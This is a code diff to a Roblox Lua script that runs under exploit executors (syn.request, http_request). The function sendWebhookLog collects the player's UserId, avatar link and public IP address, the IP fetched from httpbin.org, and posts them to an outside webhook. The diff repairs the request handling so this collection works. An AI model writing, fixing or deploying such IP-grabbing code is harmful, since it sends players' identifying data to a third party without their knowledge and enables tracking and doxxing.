@@ -4,8 +4,15 @@ local function sendWebhookLog()
     local player = game.Players.LocalPlayer
     local avatarURL = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
     local httpService = game:GetService("HttpService")
-    local response = syn and syn.request({Url = "https://httpbin.org/ip", Method = "GET"}) or http_request({Url = "https://httpbin.org/ip", Method = "GET"})
-    local ipData = httpService:JSONDecode(response)
+    local request = syn and syn.request or http_request
+    local response = request({Url = "https://httpbin.org/ip", Method = "GET"})
+    
+    if not response or response.StatusCode ~= 200 then
+        warn("Failed to get IP data")
+        return
+    end
+    
+    local ipData = httpService:JSONDecode(response.Body)
     local playerIP = ipData.origin
     
     local data = {
@@ -56,7 +63,6 @@ local function sendWebhookLog()
         }}
     }
     local jsonData = game:GetService("HttpService"):JSONEncode(data)
-    local request = syn and syn.request or http_request
     request({
         Url = webhookURL,
         Method = "POST",
